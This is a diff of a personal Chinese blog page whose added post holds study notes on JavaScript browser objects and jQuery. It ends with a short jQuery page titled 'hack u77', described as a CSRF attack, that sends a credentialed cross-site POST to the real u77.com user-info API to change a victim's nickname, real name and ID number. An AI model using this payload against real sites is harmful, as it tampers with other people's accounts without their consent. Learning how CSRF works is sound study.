@@ -6,24 +6,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="han个人博客">
-    <title>note12 - han个人博客</title>
+    <title>note14 - han个人博客</title>
     <meta name="author" content="han">
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 初学HTML\n\n\n\n\n1. 些简单的标签12345678910111213&lt;html&gt;   \t\t\t\t//&lt;html&gt;与&lt;/html&gt;之间的文本描述网页    &lt;head&gt;        &lt;title&gt;网页标题&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;       \t\t//&lt;body&gt;与&lt;/body&gt;之间的文本是可见的页面内容        &lt;h1&gt;        \t这是一个标题\t//一级标题        &lt;/h1&gt;        &lt;p&gt;        \t这是一个段落\t//段落部分        &lt;/p&gt;    &lt;/body&gt;&lt;/html&gt;\n\n2. html中的标签：12345* HTML标题是通过`&lt;h1&gt;-&lt;h6&gt;`等标签进行定义的* HTML段落是通过`&lt;p&gt;`标签进行定义的* HTML链接是通过`&lt;a&gt;`标签进行定义的* HTML图像是通过`&lt;img&gt;`标签进行定义的* HTML表格是通过`table/thead/tbody/th/td`等标签来定义的\n\n3. HTML form表单1&lt;form action=\"www.baidu.com\" method=\"get\" enctype=\"application/x-form-urlenconded\"&gt;\n\n123* Action 属性表明表单将要提交到哪里* Method 表示提交用的方法分别为`get`和`post`可选* Enctype 规定在发送表单数据前对数据进行编码的格式\n\n4. 输入框&lt;input&gt;标签最常用1234567* `type=&quot;text&quot;` 普通的文本输入框* `type=&quot;password&quot;`带星号的密码输入框* `type=&quot;radio&quot;`单选框，同一类型要有统一的`name`属性，表明是一类* `type=&quot;checkbox&quot;`复选框，添加`checked`属性会默认选中* `type=&quot;file&quot;` 文件上传选择* `type=&quot;email&quot;`带简单验证的邮箱输入* `&lt;textarea&gt;`标签input只能单行输入，`textarea`可以多行输入\n\n","dateCreated":"2019-07-30T21:26:09+08:00","dateModified":"2019-07-30T21:28:47+08:00","datePublished":"2019-07-30T21:26:09+08:00","description":"Abstract: 初学HTML","headline":"note12","image":["https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1050&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/07/30/note12/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/07/30/note12/","keywords":"HTML","thumbnailUrl":"https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=1050&q=80"}</script>
-    <meta name="description" content="Abstract: 初学HTML">
-<meta name="keywords" content="HTML">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: JS BOM和jQuery，以及php环境的搭建\n\n\n\n\n1. JS BOMBOM全名Browser Object Model，即浏览器对象模型。\n\nWindow方法\n12345678#打开新窗口window.open()#关闭当前窗口window.close()#移动当前窗口window.moveTo()#调整当前窗口的尺寸window.resizeTo()\n\nScreen屏幕\n1234#可用的屏幕宽度screen.availWidth#可用的屏幕高度screen.availHeight\n\nLocation\n1234567891011121314#web主机的域名location.hostname#当前页面的路径和文件名location.pathname#web主机的端口（80和443）location.port#使用的web协议（http或https）location.protocol#返回当前页面的URL（也可以用作跳转）location.href#返回URL的路径名location.pathname#加载新的文档location.assign\n\nHistory\n1234#与在浏览器点击后退按钮相同history.back()#与在浏览器点击向前按钮相同history.forward()\n\nNavigator\n12345678910111213141516171819&lt;html&gt;    &lt;head&gt;    \t&lt;meta charset=\"utf-8\"&gt;        &lt;title&gt;navigator用法&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=\"example\"&gt;&lt;/div&gt;        &lt;script&gt;        \ttxt = \"&lt;p&gt;浏览器代号：\" + navigator.appCodeName + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;浏览器名称：\" + navigator.appName + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;浏览器版本：\" + navigator.appVersion + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;启用Cookies: \" + navigator.cookieEnabled + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;硬件平台：\" + navigator.platform + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;用户代理：\" + navigator.userAgent + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;用户代理语言：\" + navigator.systemLanguage + \"&lt;/p&gt;\";            document.getElementById(\"example\").innerHTML = txt;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n弹窗\n123456#警告框window.alert(\"sometext\")#确认框window.confirm(\"sometext\")#提示框window.prompt(\"sometext\", \"defaultvalue\")\n\n计时\n12345678#间隔指定的毫秒数不停的执行指定代码window.setInterval(\"javascript function\", milliseconds)#停止setInterval()方法执行的函数代码window.clearInterval(intervalVariable)#第二个参数指示从当前起多少毫秒后执行第一个参数window.setTimeout(\"js function\", milliseconds)#用于停止执行setTimeout()方法的函数代码window.clearTimeout(timeoutVariable)\n\nCookie\ncookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。\ncookie的作用就是用于解决“如何记录客户端的用户信息”\n12* 当用户访问web页面时，他的名字可以记录在cookie中* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录\n\n1234#创建cookiedocument.cookie=\"username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/\";#读取cookievar x = document.cookie;\n\n\n\n2. JQuery​    内容比较细碎，多看看jQuery教程\n​    使用jQuery对u77账户进行CSRF攻击，代码如下：\n123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt;    &lt;title&gt;hack u77&lt;/title&gt;    &lt;script src=\"https://libs.baidu.com/jquery/2.0.0/jquery.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\"&gt;        $.ajax(&#123;        type:'POST',        url:\"http://www.u77.com/api/user/info\",        dataType:'json',        data: &#123;            allow_status:\"1\",            heading:\"\",            id_number:\"123456789123456789\",            nickname:\"wangyingminghanpi\",            real_name:\"本币\",            user_tag:'[]',        &#125;,        xhrFields:&#123;            withCredentials:true  //支持附带详细信息,可以携带cookie        &#125;,        crossDomain: true,//请求偏向外域,支持跨域请求        success: function (data) &#123;          console.log(data);      &#125;      &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n","dateCreated":"2019-08-01T20:35:57+08:00","dateModified":"2019-08-01T20:43:46+08:00","datePublished":"2019-08-01T20:35:57+08:00","description":"Abstract: JS BOM和jQuery，以及php环境的搭建","headline":"note14","image":["https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/01/note14/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/01/note14/","keywords":"DOM, BOM, jQuery","thumbnailUrl":"https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"}</script>
+    <meta name="description" content="Abstract: JS BOM和jQuery，以及php环境的搭建">
+<meta name="keywords" content="DOM,BOM,jQuery">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="note12">
-<meta property="og:url" content="http://yoursite.com/2019/07/30/note12/index.html">
+<meta property="og:title" content="note14">
+<meta property="og:url" content="http://yoursite.com/2019/08/01/note14/index.html">
 <meta property="og:site_name" content="han个人博客">
-<meta property="og:description" content="Abstract: 初学HTML">
+<meta property="og:description" content="Abstract: JS BOM和jQuery，以及php环境的搭建">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-07-30T13:28:47.473Z">
+<meta property="og:updated_time" content="2019-08-01T12:43:46.667Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="note12">
-<meta name="twitter:description" content="Abstract: 初学HTML">
+<meta name="twitter:title" content="note14">
+<meta name="twitter:description" content="Abstract: JS BOM和jQuery，以及php环境的搭建">
     
     
         
@@ -32,8 +32,8 @@
         <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
     
     
-        <meta property="og:image" content="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80"/>
-        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80"/>
+        <meta property="og:image" content="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500"/>
     
     
     
@@ -259,20 +259,20 @@
         <div class="post-header main-content-wrap text-center">
     
         <h1 class="post-title">
-            note12
+            note14
         </h1>
     
     
         <div class="post-meta">
-    <time datetime="2019-07-30T21:26:09+08:00">
+    <time datetime="2019-08-01T20:35:57+08:00">
 	
-		    Jul 30, 2019
+		    Aug 01, 2019
     	
     </time>
     
         <span>in </span>
         
-    <a class="category-link" href="/categories/Web-Security/">Web Security</a>
+    <a class="category-link" href="/categories/Web-Security/">Web Security</a>, <a class="category-link" href="/categories/Web-Security/笔记/">笔记</a>
 
 
     
@@ -284,20 +284,46 @@
     
     <div class="post-content markdown">
         <div class="main-content-wrap">
-            <p><strong>Abstract</strong>: 初学HTML</p>
+            <p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p>
 <a id="more"></a>
 
 <!--export-->
 
-<h3 id="1-些简单的标签"><a href="#1-些简单的标签" class="headerlink" title="1. 些简单的标签"></a>1. 些简单的标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>   				//<span class="tag">&lt;<span class="name">html</span>&gt;</span>与<span class="tag">&lt;/<span class="name">html</span>&gt;</span>之间的文本描述网页</span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>网页标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>       		//<span class="tag">&lt;<span class="name">body</span>&gt;</span>与<span class="tag">&lt;/<span class="name">body</span>&gt;</span>之间的文本是可见的页面内容</span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        	这是一个标题	//一级标题</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        	这是一个段落	//段落部分</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="1-JS-BOM"><a href="#1-JS-BOM" class="headerlink" title="1. JS BOM"></a>1. JS BOM</h3><p>BOM全名Browser Object Model，即浏览器对象模型。</p>
+<ul>
+<li><p>Window方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#打开新窗口</span><br><span class="line"><span class="built_in">window</span>.open()</span><br><span class="line">#关闭当前窗口</span><br><span class="line"><span class="built_in">window</span>.close()</span><br><span class="line">#移动当前窗口</span><br><span class="line"><span class="built_in">window</span>.moveTo()</span><br><span class="line">#调整当前窗口的尺寸</span><br><span class="line"><span class="built_in">window</span>.resizeTo()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Screen屏幕</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#可用的屏幕宽度</span><br><span class="line">screen.availWidth</span><br><span class="line">#可用的屏幕高度</span><br><span class="line">screen.availHeight</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Location</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#web主机的域名</span><br><span class="line">location.hostname</span><br><span class="line">#当前页面的路径和文件名</span><br><span class="line">location.pathname</span><br><span class="line">#web主机的端口（80和443）</span><br><span class="line">location.port</span><br><span class="line">#使用的web协议（http或https）</span><br><span class="line">location.protocol</span><br><span class="line">#返回当前页面的URL（也可以用作跳转）</span><br><span class="line">location.href</span><br><span class="line">#返回URL的路径名</span><br><span class="line">location.pathname</span><br><span class="line">#加载新的文档</span><br><span class="line">location.assign</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>History</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#与在浏览器点击后退按钮相同</span><br><span class="line">history.back()</span><br><span class="line">#与在浏览器点击向前按钮相同</span><br><span class="line">history.forward()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Navigator</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>navigator用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        	txt = <span class="string">"&lt;p&gt;浏览器代号："</span> + navigator.appCodeName + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;浏览器名称："</span> + navigator.appName + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;浏览器版本："</span> + navigator.appVersion + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;启用Cookies: "</span> + navigator.cookieEnabled + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;硬件平台："</span> + navigator.platform + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;用户代理："</span> + navigator.userAgent + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;用户代理语言："</span> + navigator.systemLanguage + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"example"</span>).innerHTML = txt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>弹窗</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#警告框</span><br><span class="line"><span class="built_in">window</span>.alert(<span class="string">"sometext"</span>)</span><br><span class="line">#确认框</span><br><span class="line"><span class="built_in">window</span>.confirm(<span class="string">"sometext"</span>)</span><br><span class="line">#提示框</span><br><span class="line"><span class="built_in">window</span>.prompt(<span class="string">"sometext"</span>, <span class="string">"defaultvalue"</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>计时</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#间隔指定的毫秒数不停的执行指定代码</span><br><span class="line"><span class="built_in">window</span>.setInterval(<span class="string">"javascript function"</span>, milliseconds)</span><br><span class="line">#停止setInterval()方法执行的函数代码</span><br><span class="line"><span class="built_in">window</span>.clearInterval(intervalVariable)</span><br><span class="line">#第二个参数指示从当前起多少毫秒后执行第一个参数</span><br><span class="line"><span class="built_in">window</span>.setTimeout(<span class="string">"js function"</span>, milliseconds)</span><br><span class="line">#用于停止执行setTimeout()方法的函数代码</span><br><span class="line"><span class="built_in">window</span>.clearTimeout(timeoutVariable)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Cookie</p>
+<p>cookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。</p>
+<p>cookie的作用就是用于解决“如何记录客户端的用户信息”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 当用户访问web页面时，他的名字可以记录在cookie中</span><br><span class="line">* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-html中的标签："><a href="#2-html中的标签：" class="headerlink" title="2. html中的标签："></a>2. html中的标签：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* HTML标题是通过`&lt;h1&gt;-&lt;h6&gt;`等标签进行定义的</span><br><span class="line">* HTML段落是通过`&lt;p&gt;`标签进行定义的</span><br><span class="line">* HTML链接是通过`&lt;a&gt;`标签进行定义的</span><br><span class="line">* HTML图像是通过`&lt;img&gt;`标签进行定义的</span><br><span class="line">* HTML表格是通过`table/thead/tbody/th/td`等标签来定义的</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建cookie</span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/"</span>;</span><br><span class="line">#读取cookie</span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-HTML-form表单"><a href="#3-HTML-form表单" class="headerlink" title="3. HTML form表单"></a>3. HTML form表单</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"www.baidu.com"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">enctype</span>=<span class="string">"application/x-form-urlenconded"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Action 属性表明表单将要提交到哪里</span><br><span class="line">* Method 表示提交用的方法分别为`get`和`post`可选</span><br><span class="line">* Enctype 规定在发送表单数据前对数据进行编码的格式</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-输入框-lt-input-gt-标签最常用"><a href="#4-输入框-lt-input-gt-标签最常用" class="headerlink" title="4. 输入框&lt;input&gt;标签最常用"></a>4. 输入框<code>&lt;input&gt;</code>标签最常用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* `type=&quot;text&quot;` 普通的文本输入框</span><br><span class="line">* `type=&quot;password&quot;`带星号的密码输入框</span><br><span class="line">* `type=&quot;radio&quot;`单选框，同一类型要有统一的`name`属性，表明是一类</span><br><span class="line">* `type=&quot;checkbox&quot;`复选框，添加`checked`属性会默认选中</span><br><span class="line">* `type=&quot;file&quot;` 文件上传选择</span><br><span class="line">* `type=&quot;email&quot;`带简单验证的邮箱输入</span><br><span class="line">* `&lt;textarea&gt;`标签input只能单行输入，`textarea`可以多行输入</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-JQuery"><a href="#2-JQuery" class="headerlink" title="2. JQuery"></a>2. JQuery</h3><p>​    内容比较细碎，多看看<a href="https://www.runoob.com/jquery/jquery-tutorial.html" target="_blank" rel="noopener">jQuery教程</a></p>
+<p>​    使用jQuery对u77账户进行CSRF攻击，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hack u77<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://libs.baidu.com/jquery/2.0.0/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">        type:<span class="string">'POST'</span>,</span></span><br><span class="line"><span class="javascript">        url:<span class="string">"http://www.u77.com/api/user/info"</span>,</span></span><br><span class="line"><span class="javascript">        dataType:<span class="string">'json'</span>,</span></span><br><span class="line">        data: &#123;</span><br><span class="line"><span class="javascript">            allow_status:<span class="string">"1"</span>,</span></span><br><span class="line"><span class="javascript">            heading:<span class="string">""</span>,</span></span><br><span class="line"><span class="javascript">            id_number:<span class="string">"123456789123456789"</span>,</span></span><br><span class="line"><span class="javascript">            nickname:<span class="string">"wangyingminghanpi"</span>,</span></span><br><span class="line"><span class="javascript">            real_name:<span class="string">"本币"</span>,</span></span><br><span class="line"><span class="javascript">            user_tag:<span class="string">'[]'</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        xhrFields:&#123;</span><br><span class="line"><span class="javascript">            withCredentials:<span class="literal">true</span>  <span class="comment">//支持附带详细信息,可以携带cookie</span></span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        crossDomain: <span class="literal">true</span>,<span class="comment">//请求偏向外域,支持跨域请求</span></span></span><br><span class="line"><span class="javascript">        success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(data);</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 
             
@@ -310,7 +336,7 @@
             <div class="post-footer-tags">
                 <span class="text-color-light text-small">TAGGED IN</span><br/>
                 
-    <a class="tag tag--primary tag--small t-link" href="/tags/HTML/">HTML</a>
+    <a class="tag tag--primary tag--small t-link" href="/tags/BOM/">BOM</a> <a class="tag tag--primary tag--small t-link" href="/tags/DOM/">DOM</a> <a class="tag tag--primary tag--small t-link" href="/tags/jQuery/">jQuery</a>
 
             </div>
         
@@ -323,9 +349,9 @@
                     
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/08/01/note13/"
-                    data-tooltip="note13"
-                    aria-label="PREVIOUS: note13"
+                    href="/2019/08/01/welcome1/"
+                    data-tooltip="welcome1"
+                    aria-label="PREVIOUS: welcome1"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -337,9 +363,9 @@
                     
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/07/30/stage1-exam/"
-                    data-tooltip="stage1知识盲点"
-                    aria-label="NEXT: stage1知识盲点"
+                    href="/2019/08/01/note13/"
+                    data-tooltip="note13"
+                    aria-label="NEXT: note13"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -364,7 +390,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/07/30/note12/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/08/01/note14/"
                     title="Share on Facebook"
                     aria-label="Share on Facebook"
                 >
@@ -377,7 +403,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/07/30/note12/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/08/01/note14/"
                     title="Share on Twitter"
                     aria-label="Share on Twitter"
                 >
@@ -390,7 +416,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/07/30/note12/"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/08/01/note14/"
                     title="Share on Google+"
                     aria-label="Share on Google+"
                 >
@@ -438,9 +464,9 @@
                     
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/08/01/note13/"
-                    data-tooltip="note13"
-                    aria-label="PREVIOUS: note13"
+                    href="/2019/08/01/welcome1/"
+                    data-tooltip="welcome1"
+                    aria-label="PREVIOUS: welcome1"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -452,9 +478,9 @@
                     
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
-                    href="/2019/07/30/stage1-exam/"
-                    data-tooltip="stage1知识盲点"
-                    aria-label="NEXT: stage1知识盲点"
+                    href="/2019/08/01/note13/"
